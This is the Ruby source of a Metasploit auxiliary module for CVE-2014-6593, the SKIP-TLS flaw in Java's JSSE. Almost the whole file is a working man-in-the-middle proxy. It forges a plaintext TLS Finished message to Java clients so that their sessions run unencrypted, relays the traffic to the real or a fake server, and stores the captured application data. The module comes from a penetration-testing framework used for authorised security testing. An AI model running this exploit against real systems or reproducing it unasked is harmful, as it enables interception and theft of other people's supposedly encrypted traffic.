##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'openssl'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
      'Description'    => %q{
        This module exploits an incomplete internal state distinction in Java Secure
        Socket Extension (JSSE) by impersonating the server and finishing the
        handshake before the peers have authenticated themselves and instantiated
        negotiated security parameters, resulting in a plaintext SSL/TLS session
        with the client. This plaintext SSL/TLS session is then proxied to the
        server using a second SSL/TLS session from the proxy to the server (or an
        alternate fake server) allowing the session to continue normally and
        plaintext application data transmitted between the peers to be saved. This
        module requires an active man-in-the-middle attack.
      },
      'Author'      =>
        [
          'Ramon de C Valle'
        ],
      'License' => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References' => [
        ['CVE', '2014-6593'],
        ['CWE', '372'],
        ['URL', 'https://www.smacktls.com/#skip'],
        ['URL', 'https://www.smacktls.com/smack.pdf'],
        ['URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html'],
        ['URL', 'https://www-304.ibm.com/support/docview.wss?uid=swg21695474']
      ],
      'DisclosureDate' => 'Jan 20 2015'
    )

    register_options(
      [
        OptString.new('FAKEHOST', [ false, 'The fake server address', nil]),
        OptString.new('FAKEPORT', [ false, 'The fake server port', 443]),
        OptString.new('HOST', [ true, 'The server address', nil]),
        OptString.new('PORT', [ true, 'The server port', 443]),
        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
        OptString.new('SRVPORT', [ true, 'The proxy port', 443]),
        OptInt.new('TIMEOUT', [ true, 'The timeout, in seconds', 5])
      ], self.class)
  end

  def PRF(secret, label, seed)
    if secret.empty?
      s1 = s2 = ''
    else
      length = ((secret.length * 1.0) / 2).ceil
      s1 = secret[0..(length - 1)]
      s2 = secret[(length - 1)..(secret.length - 1)]
    end

    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, label + seed)
    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, label + seed)

    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, hmac_md5 + label + seed)
    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, hmac_sha + label + seed)

    result = ''
    [hmac_md5.length, hmac_sha.length].max.times { |i| result << [(hmac_md5.getbyte(i) || 0) ^ (hmac_sha.getbyte(i) || 0)].pack('C') }
    result
  end

  def PRF_SHA256(secret, label, seed)
    hmac_hash = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, label + seed)
    OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, hmac_hash + label + seed)
  end

  def run
    fake_host = datastore['FAKEHOST'] || datastore['HOST']
    fake_port = datastore['FAKEPORT'] || datastore['PORT']
    host = datastore['HOST']
    local_host = datastore['SRVHOST']
    local_port = datastore['SRVPORT']
    port = datastore['PORT']
    timeout = datastore['TIMEOUT']

    proxy = TCPServer.new(local_host, local_port)
    print_status('Listening on %s:%d' % [proxy.addr[2], proxy.addr[1]])

    loop do
      Thread.start(proxy.accept) do |client|
      #loop do
        finished_sent = false
        handshake_messages = ''
        application_data = ''

        #client = proxy.accept

        print_status('Accepted connection from %s:%d' % [client.addr[2], client.addr[1]])

        context = OpenSSL::SSL::SSLContext.new(:TLSv1_2)
        context.verify_mode = OpenSSL::SSL::VERIFY_NONE

        tcp_socket = TCPSocket.new(fake_host, fake_port)
        fake_server = OpenSSL::SSL::SSLSocket.new(tcp_socket, context)
        fake_server.connect

        print_status('Connected to %s:%d' % [fake_host, fake_port])

        server = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM)

        begin
          server.connect_nonblock(Socket.pack_sockaddr_in(port, host))

        rescue IO::WaitWritable
          raise Errno::ETIMEDOUT if IO.select(nil, [server], nil, timeout).nil?
        end

        print_status('Connected to %s:%d' % [host, port])

        begin
          loop do
            readable, _, _ = IO.select([client, server])

            readable.each do |r|
              case r
              when fake_server
                # The fake_server (i.e., server) is an SSL socket; Read
                # application data directly.
                header = ''
                fragment = r.readpartial(4096)

              else
                header = r.read(5)
                raise EOFError if header.nil?
                fragment = r.read(header[3, 2].unpack('n')[0])
              end

              print_status('%d bytes received' % [header.length + fragment.length])

              # Drop the server hello done message and send the finished
              # message in plaintext.
              if fragment =~ /^\x0e\x00\x00\x00/
                if header[2, 1] == "\x03"
                  verify_data = PRF_SHA256('', 'server finished', OpenSSL::Digest::SHA256.digest(handshake_messages))
                  verify_data = verify_data[0, 12]
                else
                  verify_data = PRF('', 'server finished', OpenSSL::Digest::MD5.digest(handshake_messages) + OpenSSL::Digest::SHA1.digest(handshake_messages))
                  verify_data = verify_data[0, 12]
                end

                finished = "\x14#{[verify_data.length].pack('N')[1, 3]}#{verify_data}"
                record = header[0, 3] + [finished.length].pack('n') + finished

                count = client.write(record)
                client.flush
                print_status('%d bytes sent' % [count])

                finished_sent = true

                # Change to the SSL socket connected to the same server or
                # to an alternate fake server.
                server.close
                server = fake_server

                # Save version used in the handshake
                version = header[2, 1]

                next
              else
                # Save handshake messages
                handshake_messages << fragment
              end unless finished_sent

              # Save application data
              application_data << fragment if finished_sent

              case r
              when client
                if finished_sent
                  # The server (i.e., fake_server) is an SSL socket
                  count = server.write(fragment)
                else
                  # The server isn't an SSL socket
                  count = server.write(header + fragment)
                end

                server.flush
                print_status('%d bytes sent' % [count])

              when fake_server
                # The client isn't an SSL socket; Add the record layer header
                # with the same version used in the handshake.
                header = "\x17\x03#{version}" + [fragment.length].pack('n')
                record = header + fragment
                count = client.write(record)
                client.flush
                print_status('%d bytes sent' % [count])

              when server
                record = header + fragment
                count = client.write(record)
                client.flush
                print_status('%d bytes sent' % [count])
              end
            end
          end

        rescue EOFError, Errno::ECONNRESET
          path = store_loot(
            'tls.application_data',
            'application/octet-stream',
            client.addr[2],
            application_data,
            'application_data',
            'TLS session application data'
          )

          print_good("SSL/TLS session application data successfully stored in #{path}")

          client.close
          fake_server.close
          server.close

          next
        end

        client.close
        fake_server.close
        server.close
      end
    end

    proxy.close
  end

end
